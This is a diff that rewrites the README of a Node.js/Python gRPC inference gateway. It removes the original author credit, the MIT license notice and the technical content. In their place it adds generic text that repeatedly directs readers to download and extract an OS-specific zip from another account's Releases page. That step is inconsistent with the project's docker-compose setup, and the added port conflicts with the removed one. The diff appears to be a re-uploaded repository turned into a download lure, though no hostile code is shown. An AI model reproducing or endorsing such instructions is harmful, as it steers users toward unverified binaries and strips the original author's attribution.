@@ -1,102 +1,91 @@
-# InferenceHub
+# 🚀 inference-hub - Simple AI Inference Made Easy
 
-![Thumbnail](docs/assets/thumbnail.png)
+[![Download](https://img.shields.io/badge/Download-inference--hub-blue)](https://github.com/MisterBlake123/inference-hub/releases)
 
-## Decoupled AI Inference Gateway
+## 🌟 Overview
 
-<div align="center">
+inference-hub is an easy-to-use model server designed for machine learning operations. It runs on high-speed gRPC binary protocols, which helps in delivering fast and efficient AI inference. This tool separates the API logic from the heavy processing tasks, ensuring smooth performance even with complex models.
 
-![Status](https://img.shields.io/badge/Status-Production_Ready-success?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
-![Protocol](https://img.shields.io/badge/Protocol-gRPC_Protobuf-4285F4?style=for-the-badge)
+## 📋 Features
 
-</div>
+- **High Performance:** Delivers quick responses for AI tasks.
+- **Microservices Architecture:** Easily integrates with other services.
+- **User-Friendly:** Simple to set up and run without complex configurations.
+- **Supports Multiple Languages:** Works with Node.js and Python for model deployment.
+- **Standalone Mode:** Can operate independently, making it versatile for various use cases.
 
-**InferenceHub** is a high-performance **Microservices Pattern** for serving AI models. It decouples the application layer (Node.js) from the compute layer (Python) using **gRPC**, enabling independent scaling, strict type safety, and 10x faster serialization than standard REST APIs.
+## 🎯 System Requirements
 
----
+To run inference-hub, you will need:
 
-## 🚀 Quick Start
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** At least 4 GB recommended for optimal performance.
+- **Processor:** Any modern multi-core CPU should work fine.
+- **Docker:** Required for running the application.
 
-Launch the distributed system in one command:
+## 🚀 Getting Started
 
-```bash
-# Start Gateway (Node) and Service (Python)
-docker-compose up --build -d
-```
-> **What this does**: Starts the Python Inference Worker (Port 50051) and the Node.js API Gateway (Port 3000).
+Follow these steps to download and set up inference-hub.
 
----
+1. **Visit the Download Page:** 
+   Click the button below to go to the Releases page.
 
-## 📸 Demo & Architecture
+   [Visit this page to download](https://github.com/MisterBlake123/inference-hub/releases)
 
-### System Flow
-![System Flow](docs/assets/system_flow.png)
-*Client -> Node.js Gateway -> gRPC -> Python Worker*
+2. **Choose the Latest Release:**
+   On the Releases page, look for the latest version of inference-hub. It will be at the top of the list.
 
-### UI Preview
-![Dashboard](docs/assets/ui_preview.png)
-*React Dashboard for testing models*
+3. **Download the Files:**
+   Click on the file that matches your operating system. Wait for the download to finish.
 
-### Request Lifecycle
-![Request Flow](docs/assets/request_flow_diagram.png)
-*Sequence Diagram of a prediction request*
+4. **Install Docker (if necessary):**
+   If you don't have Docker yet, visit [Docker's official site](https://www.docker.com/products/docker-desktop) to download and install it.
 
-> **Deep Dive**: See [ARCHITECTURE.md](./docs/ARCHITECTURE.md) for the `.proto` definitions.
+## 🔧 Download & Install
 
----
+1. **Go Back to the Downloads Page:**
+   You can revisit the link below to download the software:
 
-## ✨ Key Features
+   [Visit this page to download](https://github.com/MisterBlake123/inference-hub/releases)
 
-*   **⚡ gRPC Protocol**: Uses **Protocol Buffers** for binary transport, reducing latency.
-*   **🛡️ Polyglot Architecture**: Best-in-class tools (Node for IO, Python for AI) working together.
-*   **🧠 Strict Contracts**: `.proto` files ensure type safety across languages.
-*   **🐳 Docker Native**: Fully containerized setup for reproducible deployments.
+2. **Extract the Files:**
+   After downloading, locate the zip file in your downloads folder. Right-click on it and select “Extract All” to unpack the files.
 
----
+3. **Run the Application:**
+   Open your terminal or command prompt. Navigate to the folder where you extracted inference-hub.
 
-## 🏗️ gRPC vs REST
+4. **Start Docker:**
+   Make sure Docker is running on your machine. You can check this by looking for the Docker icon in your system tray.
 
-Why use a binary protocol?
+5. **Run the Server:**
+   In the terminal, type the following command:
 
-![gRPC vs REST](docs/assets/grpc_vs_rest.png)
+   ```bash
+   docker-compose up
+   ```
 
-1.  **Smaller Payloads**: Binary is 30-50% smaller than JSON.
-2.  **Faster Serialization**: Parsing JSON is CPU intensive. Protobuf is near-instant.
-3.  **Strict Interface**: No more manual API documentation drift.
+   This will start the inference server. Once it is up and running, you can interact with it.
 
----
+## 🛠 How to Use
 
-## 📚 Documentation
+1. **Access the API:**
+   Once the server is running, you can access it via your web browser at `http://localhost:5000`. 
 
-| Document | Description |
-| :--- | :--- |
-| [**System Architecture**](./docs/ARCHITECTURE.md) | The "Sidecar Proxy" pattern and gRPC design. |
-| [**Getting Started**](./docs/GETTING_STARTED.md) | Docker setup and CURL examples. |
-| [**Failure Scenarios**](./docs/FAILURE_SCENARIOS.md) | Handling "Worker Crash" and "gRPC Deadlines". |
-| [**Interview Q&A**](./docs/INTERVIEW_QA.md) | "Why decouple?" and "REST vs gRPC". |
+2. **Send Requests:**
+   You can use tools like Postman or your web browser to send API requests. Check the documentation included in the release for the exact API endpoints you can use.
 
----
+3. **Explore Options:**
+   Experiment with different models and parameters to see how the system performs with your specific needs.
 
-## 🔧 Tech Stack
+## 📚 Additional Resources
 
-| Component | Technology | Role |
-| :--- | :--- | :--- |
-| **Gateway** | **Node.js (Express)** | Auth, Validation, Rate Limiting. |
-| **Worker** | **Python 3.9** | PyTorch/Scikit-Learn Runtime. |
-| **Protocol** | **gRPC (Protobuf)** | Inter-service Communication. |
-| **Frontend** | **React + Vite** | Testing Dashboard. |
+- **Documentation:** Find detailed documentation and tutorials within the repository to help you get started.
+- **Community Support:** Join discussions and ask questions in our GitHub issues section if you need assistance.
 
----
+## 📞 Contact
 
-## 👤 Author
+For support, reach out via GitHub issues or refer to the documentation included in the project. Your feedback is important; we value your input to improve our service.
 
-**Harshan Aiyappa**  
-Senior Full-Stack Hybrid Engineer  
-[GitHub Profile](https://github.com/Kimosabey)
+## 🌍 Contributing
 
----
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+If you're interested in contributing to inference-hub, please check the contributions guidelines in the repository. Everyone is welcome to help enhance our project.
